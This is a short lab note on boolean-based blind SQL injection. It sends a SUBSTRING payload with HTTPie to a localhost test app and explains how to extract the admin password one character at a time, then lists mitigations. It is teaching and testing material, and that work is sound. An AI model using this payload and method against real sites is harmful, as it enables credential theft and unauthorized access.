# Blind SQL Injection – Advanced (Using `SUBSTRING` and Boolean-Based Payload)

**Date:** 2025-06-03 14:35:01

---

## 🧪 Objective

Test for **Boolean-based Blind SQL Injection** by extracting data using conditional logic. We want to determine the **first letter of the `admin` user's password** using payloads like:

```sql
' AND SUBSTRING(password,1,1) = 'a' -- 
```

---

## 📤 HTTP Request

### Tool: HTTPie  
### Command:
```bash
http --form POST http://localhost:5000/blind username="' AND SUBSTRING(password,1,1) = 'a' -- "
```

### Headers Sent:
| Header             | Value                      | Purpose |
|--------------------|----------------------------|---------|
| Content-Type        | application/x-www-form-urlencoded | Required for submitting form data |
| Host                | localhost:5000             | Specifies the target |
| User-Agent          | httpie/3.x or browser UA   | Identifies the tool/browser |

---

## 📥 Response

### Possible Outcomes:
- **Response says:** "User found!" → The condition was **true**, so the first letter **is 'a'**.
- **Response says:** "No such user." → The condition was **false**, so the first letter **is NOT 'a'**.

---

## 🔍 Explanation

- `SUBSTRING(password,1,1) = 'a'` checks if the **first character** of the password is `'a'`.
- If **true**, a matching user is returned — revealing that `'a'` is correct.
- Iterate through the alphabet (`a-z`, `0-9`) until you get a **positive match**.
- Continue testing `SUBSTRING(password,2,1)`, `SUBSTRING(password,3,1)`, etc., to brute-force the full password.

---

## 🧠 Exploitation Use

This allows attackers to:
- Enumerate **credentials** without seeing them directly.
- Bypass login by knowing real passwords or session secrets.

---

## 🛡️ Mitigation

- **Use Prepared Statements** to prevent SQL execution with user input.
- Sanitize all input using **whitelisting**.
- Implement **rate-limiting** to prevent brute-force style enumeration.

